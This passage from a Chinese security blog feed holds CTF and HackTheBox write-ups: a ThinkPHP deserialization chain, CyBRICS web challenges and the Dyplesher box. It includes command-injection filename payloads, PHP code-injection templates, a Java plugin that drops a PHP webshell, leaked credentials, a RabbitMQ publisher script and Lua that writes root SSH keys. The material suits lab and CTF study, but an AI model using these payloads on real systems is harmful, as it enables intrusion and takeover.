toString用的是model类的)一样用的是Conversion类里的__toString() =&gt; toJson =&gt; toArray =&gt; getAttr =&gt; getValue() 我们主要在getAttr,getValue里构造 123456789101112131415161718192021222324252627282930313233343536373839404142public function getAttr(string $name)&#123; try &#123; $relation = false; $value = $this-&gt;getData($name); &#125; catch (InvalidArgumentException $e) &#123; $relation = $this-&gt;isRelationAttr($name); $value = null; &#125; return $this-&gt;getValue($name, $value, $relation);&#125;public function getData(string $name = null)//$name='wh1t3p1g'&#123; if (is_null($name)) &#123; return $this-&gt;data; &#125; $fieldName = $this-&gt;getRealFieldName($name); if (array_key_exists($fieldName, $this-&gt;data)) &#123;//$this-&gt;data = array(\"wh1t3p1g\"=&gt;\"whoami\"); return $this-&gt;data[$fieldName];//返回'whoami'，回到getAttr &#125; elseif (array_key_exists($fieldName, $this-&gt;relation)) &#123; return $this-&gt;relation[$fieldName]; &#125;protected function getValue(string $name, $value, bool $relation = false)&#123; //$name='wh1t3p1g' $value=‘ls’ $relation=false // 检测属性获取器 $fieldName = $this-&gt;getRealFieldName($name); //该函数默认返回$name='wh1t3p1g'=$fieldName $method = 'get' . App::parseName($name, 1) . 'Attr'; //拼接字符：getlinAttr if (isset($this-&gt;withAttr[$fieldName])) &#123; //['wh1t3p1g'=&gt;'system'] if ($relation) &#123; //$relation=false $value = $this-&gt;getRelationValue($name); &#125; $closure = $this-&gt;withAttr[$fieldName]; //$closure='system' $value = $closure($value, $this-&gt;data);//system('whoami',$this-&gt;data &#125; ....... return $value;&#125; 至此完成整条利用链。注意它的调用方法是system(&quot;whoami&quot;, [&quot;wh1t3p1g&quot;=&gt;&quot;whoami&quot;]).这是一种合法调用。 小结下。tp所有系列反序列化链就这么多了。大体上思路都是一样的。只有5.0版本是较为复杂的写文件。其他版本都可以直接rce.魔术方法也基本都是destruct，toString,call调用。其中5.2,6.0是没有call的必要的。 tp6.0任意文件写这个洞其实没必要跟了。就是年后ichunqiu战疫比赛时出现过的洞。session可以更改成32位.php后缀。然后如果session内容可控的话就相当于写了shell.这个还是比较常见的。 小结没想到真的还是把这个项目的内容都跟完了。不得不说理解了一些原理后也就对tp系列payload的构造有了更深的理解。虽然大部分实战中黑盒基本测不出来就是了。 下一步在考虑是去看看laravel还是java的几个反序列化链子。加油吧","categories":[],"tags":[{"name":"WEB","slug":"WEB","permalink":"https://www.bycsec.top/tags/WEB/"},{"name":"PHP","slug":"PHP","permalink":"https://www.bycsec.top/tags/PHP/"}]},{"title":"CyBRICS-CTF 2020","slug":"CyBRICS-CTF-2020","date":"2020-07-26T12:56:52.000Z","updated":"2021-02-18T05:08:54.237Z","comments":true,"path":"2020/07/26/CyBRICS-CTF-2020/","link":"","permalink":"https://www.bycsec.top/2020/07/26/CyBRICS-CTF-2020/","excerpt":"Cybrics比赛感觉都没队友在打……简单记录下做的几道题","text":"Cybrics比赛感觉都没队友在打……简单记录下做的几道题 Hunt签到不谈。 Gif2png首先是源码审计. 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109import loggingimport reimport subprocessimport uuidfrom pathlib import Pathfrom flask import Flask, render_template, request, redirect, url_for, flash, send_from_directoryfrom flask_bootstrap import Bootstrapimport osfrom werkzeug.utils import secure_filenameimport filetypeALLOWED_EXTENSIONS = &#123;'gif'&#125;app = Flask(__name__)app.config['UPLOAD_FOLDER'] = './uploads'app.config['SECRET_KEY'] = '********************************'app.config['MAX_CONTENT_LENGTH'] = 500 * 1024 # 500KbffLaG = \"cybrics&#123;********************************&#125;\"Bootstrap(app)logging.getLogger().setLevel(logging.DEBUG)def allowed_file(filename): return '.' in filename and filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS@app.route('/', methods=['GET', 'POST'])def upload_file(): logging.debug(request.headers) if request.method == 'POST': if 'file' not in request.files: logging.debug('No file part') flash('No file part', 'danger') return redirect(request.url) file = request.files['file'] if file.filename == '': logging.debug('No selected file') flash('No selected file', 'danger') return redirect(request.url) if not allowed_file(file.filename): logging.debug(f'Invalid file extension of file: &#123;file.filename&#125;') flash('Invalid file extension', 'danger') return redirect(request.url) if file.content_type != \"image/gif\": logging.debug(f'Invalid Content type: &#123;file.content_type&#125;') flash('Content type is not \"image/gif\"', 'danger') return redirect(request.url) if not bool(re.match(\"^[a-zA-Z0-9_\\-. '\\\"\\=\\$\\(\\)\\|]*$\", file.filename)) or \"..\" in file.filename: logging.debug(f'Invalid symbols in filename: &#123;file.content_type&#125;') flash('Invalid filename', 'danger') return redirect(request.url) if file and allowed_file(file.filename): filename = secure_filename(file.filename) file.save(os.path.join(app.config['UPLOAD_FOLDER'], file.filename)) mime_type = filetype.guess_mime(f'uploads/&#123;file.filename&#125;') if mime_type != \"image/gif\": logging.debug(f'Invalid Mime type: &#123;mime_type&#125;') flash('Mime type is not \"image/gif\"', 'danger') return redirect(request.url) uid = str(uuid.uuid4()) os.mkdir(f\"uploads/&#123;uid&#125;\") logging.debug(f\"Created: &#123;uid&#125;. Command: ffmpeg -i 'uploads/&#123;file.filename&#125;' \\\"uploads/&#123;uid&#125;/%03d.png\\\"\") command = subprocess.Popen(f\"ffmpeg -i 'uploads/&#123;file.filename&#125;' \\\"uploads/&#123;uid&#125;/%03d.png\\\"\", shell=True) command.wait(timeout=15) logging.debug(command.stdout) flash('Successfully saved', 'success') return redirect(url_for('result', uid=uid)) return render_template(\"form.html\")@app.route('/result/&lt;uid&gt;/')def result(uid): images = [] for image in os.listdir(f\"uploads/&#123;uid&#125;\"): mime_type = filetype.guess(str(Path(\"uploads\") / uid / image)) if image.endswith(\".png\") and mime_type is not None and mime_type.EXTENSION == \"png\": images.append(image) return render_template(\"result.html\", uid=uid, images=images)@app.route('/uploads/&lt;uid&gt;/&lt;image&gt;')def image(uid, image): logging.debug(request.headers) dir = str(Path(app.config['UPLOAD_FOLDER']) / uid) print(dir) return send_from_directory(dir, image)@app.errorhandler(413)def request_entity_too_large(error): return \"File is too large\", 413if __name__ == \"__main__\": app.run(host='localhost', port=5000, debug=False, threaded=True) 注意到执行ffmpeg有个变量拼接。我们的file.filename可控。不过需要经过前面几层检验。简单看可以发现一方面限制了后缀（取最后一个. 后字符检测是否为gif）另外限制了可用字符。不过这些字符已经够用了。 首先我的思路是去找ffmpeg的可用flag.通过-h列出一些flag后。我注意到这样几个 123-report generate a report-filter_script filename read stream filtergraph description from a file-metadata string=string add metadata 这里我主要是寻找跟文件有关的选项。其中report会在当前目录生成一个log文件。filter_script可以读取一个文件内容作为stream filter. -metadata 可以添加一组键值。加入到输出的metadata中。 不过本地跑起来简单尝试下后。会发现因为我们不可用/字符。所以想要控制路径是做不到的。我们必须要让包含flag的信息输出到uploads的沙盒下。而注意到题目/uploads/{uid}/下的内容并没有像其他两个路由那样做文件类型检查。所以我们是可以直接访问的。 因此-report无法使用。因为它只能在当前目录生成报告。而-filter_script假如搭配-report倒是可以把读取文件内容时的错误信息输出到日志中。但是因为日志读不了所以也不可行。 于是我关注点就集中到了-metadata上。我们可以构造这样的命令闭合引号并且执行。 1ffmpeg -i 'uploads/logo.gif' -metadata language=$(cat main.py| grep ffLaG |base64) -metadata abc='.gif' \"uploads/&#123;uid&#125;/%03d.png\" 从输出结果上看是成功执行命令了的。但是本地测试发现一个问题。输出的png读不到其metadata属性。 简单的查阅了下文档以及谷歌后我推测应该是因为ffmpeg的metadata选项不支持png.不过文档里我发现视频文件是肯定可以修改增加metadata的。因此当我尝试将上面的命令改为输出成avi后。是可以通过exiftool读取到metadata中的language的。 那么我们现在只需要一个强迫转换输出类型的flag. 再次查文档发现了-f fmt force format。所以最终payload如下。我们只需在传好logo.gif后传gif文件并以如下作为文件名 1logo.gif' -metadata language=$(cat main.py| grep ffLaG |base64) -f avi -metadata abc='.gif 首先我们保证了结尾最后的.末尾是gif绕过后缀检查。之后执行命令时将会把main.py中的ffLaG变量值保存到输出的language metadata中。本地跑起来的话。会发现在沙盒下最终生成了名为%03d.png的avi类型文件。并且可以用exiftool获取到其metadata。 本地打通的话去远程打肯定就没问题了。这里打远程时稍微多发了几次包。最终获取到图片并得到flag 看着这个flag我高度怀疑自己不是预期做的……搞不好可以很简单解决掉。 ps:佛了。不会就我去看ffmpeg的flags了吧……虽然做法很有趣但是未免太傻了……别人的payload:&#39;$(cp main.py uploads$(pwd | cut -c1)GENERATED_UID$(pwd | cut -c1))&#39;.gifwtcltcl。忘记用pwd拼接目录了。bash script都白写了。 woc这道题目最主要的就是用代码混淆视线。所以关键在于一定要找到真正可以利用的漏洞代码。首先注意到一个似乎可以利用的地方。在calc.php 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647&lt;?phpif (!@$_SESSION['userid']) &#123; redir(\".\");&#125; elseif (!@$_GET['template']) &#123; redir(\".\");&#125;$userid = $_SESSION['userid'];$template = $_GET['template'];if (!preg_match('#^[a-f0-9]&#123;8&#125;-[a-f0-9]&#123;4&#125;-[a-f0-9]&#123;4&#125;-[a-f0-9]&#123;4&#125;-[a-f0-9]&#123;12&#125;$#s', $template)) &#123; redir(\".\");&#125;if (!is_file(\"calcs/$userid/templates/$template.html\")) &#123; redir(\".\");&#125;if (trim(@$_POST['field'])) &#123; $field = trim($_POST['field']); if (!preg_match('#(?=^([ %()*+\\-./]+|\\d+|M_PI|M_E|log|rand|sqrt|a?(sin|cos|tan)h?)+$)^([^()]*|([^()]*\\((?&gt;[^()]+|(?4))*\\)[^()]*)*)$#s', $field)) &#123; $value = \"BAD\"; &#125; else &#123; if (@$_POST['share']) &#123; $calc = uuid(); file_put_contents(\"calcs/$userid/$calc.php\", \"&lt;script&gt;var preloadValue = &lt;?=json_encode((string)($field))?&gt;;&lt;/script&gt;\\n\" . file_get_contents(\"inc/calclib.html\") . file_get_contents(\"calcs/$userid/templates/$template.html\")); redir(\"?p=sharelink&amp;calc=$calc\"); &#125; else &#123; try &#123; $value = eval(\"return $field;\"); &#125; catch (Throwable $e) &#123; $value = null; &#125; if (!is_numeric($value) &amp;&amp; !is_string($value)) &#123; $value = \"ERROR\"; &#125; else &#123; $value = (string)$value; &#125; &#125; &#125; echo \"&lt;script&gt;var preloadValue = \" . json_encode($value) . \";&lt;/script&gt;\";&#125;require \"inc/calclib.html\";require \"calcs/$userid/templates/$template.html\"; 第一想法肯定是利用那个eval.不过这里字符实在是太限制了。我很快就发现根本无法构造出INF,NAN以外等等字符并取单。因此得尝试变化思路。 注意到题目功能。整体上提供了一个假注册登录功能用来记录session.同时允许我们上传新template.我们可以根据calc.php中所传template参数选择template。前往newtemplate.php。发现其限制了我们template的代码中不能含有&lt;?且必须包含它要求的id标签。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273&lt;?phpif (!@$_SESSION['userid']) &#123; redir(\".\");&#125;$userid = $_SESSION['userid'];$error = false;if (trim(@$_POST['html'])) &#123; do &#123; $html = trim($_POST['html']); if (strpos($html, '&lt;?') !== false) &#123; $error = \"Bad chars\"; break; &#125; $requiredBlocks = [ 'id=\"back\"', 'id=\"field\" name=\"field\"', 'id=\"digit0\"', 'id=\"digit1\"', 'id=\"digit2\"', 'id=\"digit3\"', 'id=\"digit4\"', 'id=\"digit5\"', 'id=\"digit6\"', 'id=\"digit7\"', 'id=\"digit8\"', 'id=\"digit9\"', 'id=\"plus\"', 'id=\"equals\"', ]; foreach ($requiredBlocks as $block) &#123; if (strpos($html, $block) === false) &#123; $error = \"Missing required block: '$block'\"; break(2); &#125; &#125; $uuid = uuid(); if (!file_put_contents(\"calcs/$userid/templates/$uuid.html\", $html)) &#123; $error = \"Unexpected error! Contact orgs to fix. cybrics.net/rules#contacts\"; break; &#125; redir(\".\"); &#125; while (false);&#125;?&gt; &lt;div class=\"row\"&gt; &lt;div class=\"p-5 mx-auto col-10 col-md-10 bg-info\"&gt;&lt;?phpif ($error) &#123;?&gt; &lt;div class=\"alert alert-danger\" role=\"alert\"&gt; &lt;button type=\"button\" class=\"close\" data-dismiss=\"alert\"&gt;×&lt;/button&gt; &lt;h4 class=\"alert-heading\"&gt;Error&lt;/h4&gt; &lt;p class=\"mb-0\"&gt;&lt;?=htmlspecialchars($error)?&gt;&lt;/p&gt; &lt;/div&gt;&lt;?php&#125;?&gt; &lt;h3 class=\"display-3\"&gt;New template&lt;/h3&gt; &lt;div class=\"px-4 order-1 order-md-2 col-lg-12\"&gt; &lt;h2 class=\"mb-4\"&gt;Insert code&lt;/h2&gt; &lt;form method=\"POST\"&gt; &lt;div class=\"form-group\"&gt; &lt;textarea style=\"min-height: 100px; font-family: 'Fira Code', Consolas, monospace;\" placeholder=\"HTML\" class=\"form-control form-control-sm\" name=\"html\" oninput=\"this.style.height = ''; this.style.height = (this.scrollHeight + 10) +'px'\"&gt;&lt;?=htmlspecialchars(@$_POST['html'])?&gt;&lt;/textarea&gt; &lt;/div&gt; &lt;button type=\"submit\" class=\"btn btn-lg btn-outline-secondary mx-3 px-3\"&gt;&lt;i class=\"fa fa-plus-square fa-fw fa-1x py-1\"&gt;&lt;/i&gt; Create Template&lt;/button&gt; &lt;/form&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; 然后我们发现。calc.php如果不传递share参数的话。将只是简单的require我们的template.但是倘若传递share.则将进行一个拼接。 12345if (@$_POST['share']) &#123; $calc = uuid(); file_put_contents(\"calcs/$userid/$calc.php\", \"&lt;script&gt;var preloadValue = &lt;?=json_encode((string)($field))?&gt;;&lt;/script&gt;\\n\" . file_get_contents(\"inc/calclib.html\") . file_get_contents(\"calcs/$userid/templates/$template.html\")); redir(\"?p=sharelink&amp;calc=$calc\");&#125; 我们的变量field与之后的inc/calclib.html，以及自己的template进行拼接。当内容作为file_put_contents的参数写进新的php文件时。&lt;?=总是可用的(即作为echo 调用)那么我们只需要想办法解决掉中间拼接的文件inc/calclib.html即可。通过使用注释符将两者中间的html文件注释掉，并在template中写入恶意代码就能完成 本地模拟写入的文件。可以看到中间的部分被注释掉。我们只需注意正确闭合括号。payloadhtml内容 1234567891011121314151617181920212223&lt;html&gt;&lt;body&gt;&lt;input type=\"text\" class=\"part\" id=\"field\" name=\"field\" /&gt;&lt;input type=\"button\" class=\"part\" id=\"digit0\" data-append=\"0\" /&gt;&lt;input type=\"button\" class=\"part\" id=\"digit1\" data-append=\"1\" /&gt;&lt;input type=\"button\" class=\"part\" id=\"digit2\" data-append=\"2\" /&gt;&lt;input type=\"button\" class=\"part\" id=\"digit3\" data-append=\"3\" /&gt;&lt;input type=\"button\" class=\"part\" id=\"digit4\" data-append=\"4\" /&gt;&lt;input type=\"button\" class=\"part\" id=\"digit5\" data-append=\"5\" /&gt;&lt;input type=\"button\" class=\"part\" id=\"digit6\" data-append=\"6\" /&gt;&lt;input type=\"button\" class=\"part\" id=\"digit7\" data-append=\"7\" /&gt;&lt;input type=\"button\" class=\"part\" id=\"digit8\" data-append=\"8\" /&gt;&lt;input type=\"button\" class=\"part\" id=\"digit9\" data-append=\"9\" /&gt;&lt;input type=\"button\" class=\"part\" id=\"plus\" data-append=\" + \" /&gt;&lt;input type=\"button\" class=\"part\" id=\"minus\" data-append=\" - \" /&gt;&lt;input type=\"button\" class=\"part\" id=\"times\" data-append=\" * \" /&gt;&lt;input type=\"button\" class=\"part\" id=\"div\" data-append=\" / \" /&gt;&lt;input type=\"button\" class=\"part\" id=\"point\" data-append=\".\" /&gt;&lt;input type=\"button\" class=\"part\" id=\"clear\" /&gt;&lt;input type=\"button\" class=\"part\" id=\"back\" value=\"← Back\" /&gt;&lt;input type=\"submit\" class=\"part\" id=\"share\" name=\"share\" value=\"Share\" /&gt;&lt;input type=\"submit\" class=\"part\" id=\"equals\" /&gt;*/readfile(\"/flag\"))); 之后来到calc.php传值field=/*&amp;share=1即可在重定向后得到写入shell的地址。远程getflag summary题目比较有意思。体验不错。在这之前的一场3kCTF因为时间原因写不了wp了,题目质量倒是挺好的。下周开始hw就不更文章","categories":[],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://www.bycsec.top/tags/CTF/"},{"name":"WEB","slug":"WEB","permalink":"https://www.bycsec.top/tags/WEB/"},{"name":"wp","slug":"wp","permalink":"https://www.bycsec.top/tags/wp/"}]},{"title":"hackthebox-Dyplesher","slug":"hackthebox-Dyplesher","date":"2020-07-24T00:23:57.000Z","updated":"2021-02-18T05:09:12.856Z","comments":true,"path":"2020/07/24/hackthebox-Dyplesher/","link":"","permalink":"https://www.bycsec.top/2020/07/24/hackthebox-Dyplesher/","excerpt":"Dyplesher靶机是自己第一次完成的现役insane难度htb靶机。靶机涉及的服务相对比较多,包括web,gogs,minecraft,memcache等等。不过说实话做完后感觉难度跟Travel差不多,到不了insane难度。可能主要是里面的Java知识对于大部分人来说偏繁琐了。总体上感觉还是不错的。这里还是简单记录下过程以及提权部分学到的知识吧。","text":"Dyplesher靶机是自己第一次完成的现役insane难度htb靶机。靶机涉及的服务相对比较多,包括web,gogs,minecraft,memcache等等。不过说实话做完后感觉难度跟Travel差不多,到不了insane难度。可能主要是里面的Java知识对于大部分人来说偏繁琐了。总体上感觉还是不错的。这里还是简单记录下过程以及提权部分学到的知识吧。 靶机ip:10.10.10.190 kaliip: 10.10.14.23 initial foothold首先是nmap基本扫描得到三个端口22,80,3000.进一步扫描发现还有其他几个端口。4369(epmd),5672(amqp),11211等。 其中11211是memcache对应端口。之前在travel中用过,所以印象比较深刻。不过这里还是简单从低端口开始审计。 首先web80端口发现提示这里可能跟mc相关。从cookie的配置可以看出似乎使用了laravel框架。因为是黑盒所以不确定是否能用RCE打。 接下来首页还提示了我们一个子域名test.dyplesher.htb。加到hosts中。 页面的/staff有三个用户名 这三个用户名在后面会经常出现。 接下来页面信息收集完了。我们爆破下路径。发现存在/login页面。简单尝试登录未果,看来需要另外收集信息,或者login不是目的。 3000端口是个gogs服务。提供git的话看来是又有信息泄露了。不过同样我们没有可用的信息。不过gogs倒是在users处提示我们有刚刚上面的三个用户。 接下来去往test.dyplesher.htb.页面只接受两个参数,似乎是在判断你的两个输入是否一致。然后尝试注入也未果。 继续扫目录。得到.git泄露。使用githackdump下来。得到index.php源码 123456789101112131415161718192021222324252627&lt;HTML&gt;&lt;BODY&gt;&lt;h1&gt;Add key and value to memcache&lt;h1&gt;&lt;FORM METHOD=\"GET\" NAME=\"test\" ACTION=\"\"&gt;&lt;INPUT TYPE=\"text\" NAME=\"add\"&gt;&lt;INPUT TYPE=\"text\" NAME=\"val\"&gt;&lt;INPUT TYPE=\"submit\" VALUE=\"Send\"&gt;&lt;/FORM&gt;&lt;pre&gt;&lt;?phpif($_GET['add'] != $_GET['val'])&#123; $m = new Memcached(); $m-&gt;setOption(Memcached::OPT_BINARY_PROTOCOL, true); $m-&gt;setSaslAuthData(\"felamos\", \"zxcvbnm\"); $m-&gt;addServer('127.0.0.1', 11211); $m-&gt;add($_GET['add'], $_GET['val']); echo \"Done!\";&#125;else &#123; echo \"its equal\";&#125;?&gt;&lt;/pre&gt;&lt;/BODY&gt;&lt;/HTML&gt; 得到一组memcache账户。尝试web页面的登录未果。于是直接连接memcache.此处我们使用nodejs的memcache-cli.npm全局下载即可。 1memcache-cli felamos:zxcvbnm@10.10.10.190:11211 连接上后收集到三个用户名(还是上面三个人)以及三个bcrypt密码。 123$2a$10$5SAkMNF9fPNamlpWr.ikte0rHInGcU54tvazErpuwGPFePuI1DCJa$2y$12$c3SrJLybUEOYmpu1RVrJZuPyzE5sxGeM0ZChDhl8MlczVrxiA3pQK$2a$10$zXNCus.UXtiuJE5e6lsQGefnAH3zipl.FRNySz5C4RjitiwUoalS hashcat爆破之.只得到一组felamos密码mommy1。 继续用这组账户尝试登录。最后在gogs处登录成功。在80端口仍然不能登录,一度让我以为那个登录是假的。 审查用户felamos的仓库。只有gitlab跟memcached两个。其中memcached的我们已经收集过了。gitlab仓库发现没有内容,但是有release. 下载release中的repo.zip(20mb下了快半小时……难受)并解压。 12345678910111213141516root@byc404:~/htb/boxes/Dyplesher/git/repositories# find .../@hashed./@hashed/4e./@hashed/4e/07./@hashed/4e/07/4e07408562bedb8b60ce05c1decfe3ad16b72230967de01f640b7e4729b49fce./@hashed/4e/07/4e07408562bedb8b60ce05c1decfe3ad16b72230967de01f640b7e4729b49fce.bundle./@hashed/6b./@hashed/6b/86./@hashed/6b/86/6b86b273ff34fce19d6b804eff5a3f5747ada4eaa22f1d49c01e52ddb7875b4b.bundle./@hashed/4b./@hashed/4b/22./@hashed/4b/22/4b227777d4dd1fc61c6f884f48641d02b4d121d3fd328cb08b5531fcacdabf8a.bundle./@hashed/d4./@hashed/d4/73./@hashed/d4/73/d4735e3a265e16eee03f59718b9b5d03019c07d8b6c51f90da3a666eec13ab35.bundle 这里有.bundle文件。我们单独拿出来并git clone。 123456#!/bin/bashfor i in $(find ../repositories | grep bundle)do git clone $idone bundle clone完后的内容就有点多了。同样简单看下四个仓库的内容,有的是跟mc有关。有的是phpbashshell有关。再次find下找到一个sqlite的db文件users.db。直接进入db.select * from users.得到 118fb40a5c8d34f249bb8a689914fcac3|$2a$10$IRgHi7pBhb9K0QBQBOzOju0PyOZhBnK4yaWjeZYdeP6oyDvCo9vc6|7|&#x2F;192.168.43.81 又是一个bcrypt密码。再度hashcat破解得到alexis1 这次我们终于能登录进80端口的页面了。进入后发现是一个控制台。里面显示的是mc信息。然后功能包括上传plugin跟重新加载指定plugin. emm虽然没玩过正版mc但是至少知道它是java写的。我在网上找了下发现有非常全面的指南。感觉就算不会java的人也能跟着做了。当然这里我刚好前一天简单学习了下maven的使用。所以就idea直接上手maven项目。 具体参考这篇文章,我就简单做下解释,当做idea学习笔记了。 首先是pom.xml配置 123456789101112131415161718192021222324252627282930313233&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;project xmlns=\"http://maven.apache.org/POM/4.0.0\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd\"&gt; &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt; &lt;groupId&gt;top.bycsec&lt;/groupId&gt; &lt;artifactId&gt;java_mc_exp&lt;/artifactId&gt; &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt; &lt;properties&gt; &lt;project.build.sourceEncoding&gt;UTF-8&lt;/project.build.sourceEncoding&gt; &lt;maven.compiler.encoding&gt;UTF-8&lt;/maven.compiler.encoding&gt; &lt;java.version&gt;10&lt;/java.version&gt; &lt;maven.compiler.source&gt;10&lt;/maven.compiler.source&gt; &lt;maven.compiler.target&gt;10&lt;/maven.compiler.target&gt; &lt;/properties&gt; &lt;repositories&gt; &lt;repository&gt; &lt;id&gt;spigotmc-repo&lt;/id&gt; &lt;url&gt;https://hub.spigotmc.org/nexus/content/repositories/snapshots/&lt;/url&gt; &lt;/repository&gt; &lt;/repositories&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.spigotmc&lt;/groupId&gt; &lt;artifactId&gt;spigot-api&lt;/artifactId&gt; &lt;version&gt;1.16.1-R0.1-SNAPSHOT&lt;/version&gt; &lt;scope&gt;provided&lt;/scope&gt; &lt;/dependency&gt; &lt;/dependencies&gt;&lt;/project&gt; groupID这种建项目前就应该已经让我们自己配置好了。我按照正常标准定为top.bycsec.然后下面properties的设定是一个小坑。因为自己idea的jdk版本跟系统不一致,然后还有系统的语言level水平等等问题。导致maven编译时会出现报错”不支持发行版本5”.经常改完了配置还是报错。解决方法只有像上面那样按照自己的标准配置pom.xml才能避免报错。 下面的仓库是spigot 给mc用的maven仓库。我们会用到的spigot-api得去对应的仓库下载。 然后最终完整的目录结构如下。 resources即外部资源包中需要plugin.yml来指定plugin信息。这里非常重要。因为我们后面要用到plugin的命字。其中似乎不能包含_这样的字符。所以直接取一个正常的名字。 然后是main下编写。这里我们因为不是用的mvn创建的,是不会指定包的。所以我们自己建个包top.bycsec.plugin并新建PluginExp作为要加载的主类。同时plugin.yml中也将这个类指定为加载的主类。 接下来是利用类的编写 1234567891011121314151617181920212223242526272829303132333435package top.bycsec.plugin;import org.bukkit.plugin.java.JavaPlugin;import java.io.File;import java.io.FileOutputStream;import java.io.IOException;public class PluginExp extends JavaPlugin &#123; @Override public void onEnable() &#123; final String code=\"&lt;?php @system($_REQUEST[byc]);?&gt;\"; try &#123; File file = new File(\"/var/www/html/bycshell.php\"); if (!file.exists()) &#123; File dir = new File(file.getParent()); dir.mkdirs(); file.createNewFile(); &#125; FileOutputStream outStream = new FileOutputStream(file); outStream.write(code.getBytes()); outStream.close(); &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; super.onEnable(); &#125; @Override public void onDisable() &#123; super.onDisable(); &#125;&#125; 首先注意插件类必须继承JavaPlugin。这个maven下载依赖时会帮我们下好。然后只需重写两个方法即可。我们使用onEnable插入恶意代码,这样就可以在插件生效时直接执行。 这里选择写入webshell原因有点多。首先题目靶机居然是不通外网的。这个我真没想到。其次java项目大多配置好了一些禁止类。runtime很有可能是行不通的。所以我选择直接写入webshell(猜了一手laravel对应的就是html文件夹而不是dyplesher.htb) 最后完成后我们使用maven编译打包。直接双击右边maven的生命周期中的package即可创建对应jar file. 回到网页上传plugin并使用plugin名byc404 reload. 写入webshell. 然后到这一步后才真正意识到靶机不通外网。所以常规弹shell不可行。只能尝试写入ssh公钥。 成功登陆。 小结下。这一部分难度其实还好。主要时间都花在爆破密码以及编写java的exp时被idea的报错给困扰了一小会上了。但是老实说确实没有什么难度。正好让自己把刚学的maven巩固了一下。一举两得。 privesc to user简单看下user文件夹下果不其然还有yuntao跟felamos两个用户 接下来在使用MinatoTW的id时发现一个重要信息 1uid&#x3D;1001(MinatoTW) gid&#x3D;1001(MinatoTW) groups&#x3D;1001(MinatoTW),122(wireshark) MinatoTW是wireshark用户组的。也就是说我们可以用靶机上的wireshark抓包。确认了下网卡应该是lo.(lo代表127.0.0.1，即localhost) 1tshark -i lo -F pcap -w byc.pcap 抓一段时间的包后用wireshark打开分析.跟下tcp流 很快就能抓到关键信息 123AMQPLib.platformS....PHP.versionS....2.11.1.informationS.... copyrightS.....capabilitiesF.....authentication_failure_closet..publisher_confirmst..consumer_cancel_notifyt..exchange_exchange_bindingst.basic.nackt..connection.blockedt..AMQPLAIN...,.LOGINS....yuntao.PASSWORDS...EashAnicOc3Op.en_US. 这一段似乎是AMQP的通信内容。其中有一组用户密码yuntao:EashAnicOc3Op 并且紧接着下面就有多组用户信息。似乎来自于mc 1234&#123;\"name\":\"MinatoTW\",\"email\":\"MinatoTW@dyplesher.htb\",\"address\":\"India\",\"password\":\"bihys1amFov\",\"subscribed\":true&#125;&#123;\"name\":\"yuntao\",\"email\":\"yuntao@dyplesher.htb\",\"address\":\"Italy\",\"password\":\"wagthAw4ob\",\"subscribed\":true&#125;&#123;\"name\":\"felamos\",\"email\":\"felamos@dyplesher.htb\",\"address\":\"India\",\"password\":\"tieb0graQueg\",\"subscribed\":true&#125; 经测试发现这三组密码均为系统用户密码。su后即可在felamos文件夹下拿到user.txt privesc to root接下来在felamos有一个yuntao的文件夹。里面写着send.sh 123#!/bin/bashecho 'Hey yuntao, Please publish all cuberite plugins created by players on plugin_data \"Exchange\" and \"Queue\". Just send url to download plugins and our new code will review it and working plugins will be added to the server.' &gt; /dev/pts/&#123;&#125; cuberite plugins 是以lua语言编写的插件。而这里的信息似乎在提示我们可以编写恶意lua插件来进行privesc.并且提示说只要提供lua的url地址就可以将插件加入服务。 “Exchange” and “Queue” 的含义在我进行了一些简单的enum后发现应该是AMQP所用到的。由于我们一开始就发现AMQP端口是对外的,而且刚刚wireshark抓到了一组yuntao的账户还没用上。极大可能就是利用amqp去进行通信加载lua插件。 这里靶机上跑着的是RabbitMQ.而RabbitMQ默认是root权限跑的。并且我们可以在靶机上找到运行信息。 我们看看一套 MQ 完整流程是什么样的： 首先将 RabbitMQ 服务启动 Producer 1、创建一个 connection2、在 connection 基础上创建一个频道 channel3、在频道 channel 上声明一个 exchange，参数为 exchange 的类型和名称4、在频道 channel 上发布消息，参数为 exchange 的名称以及路由 (routing_key) 以及消息体5、关闭 connection 这里我们可以推测前面的提示中plugin_data可能就是路由。而我们要传递的消息体就是lua的url.接下来我们使用python 的pika进行编写 12345678910import pikacreds=pika.PlainCredentials('yuntao','EashAnicOc3Op')params=pika.Connectionparams('10.10.10.190',5672,'/',creds)conn=pika.BlockingConnection(params)channel = conn.channel()channel.basic_publish(exchange='', routing_key='plugin_data',body=\"http://127.0.0.1:9001/exp.lua\")conn.close() 然后准备一个恶意的lua脚本。由于lua反弹shell我发现似乎都是不交互的，所以选择写ssh key 123f=io.open(\"/root/.ssh/authorized_keys\", \"w\")f:write(\"ssh-rsa 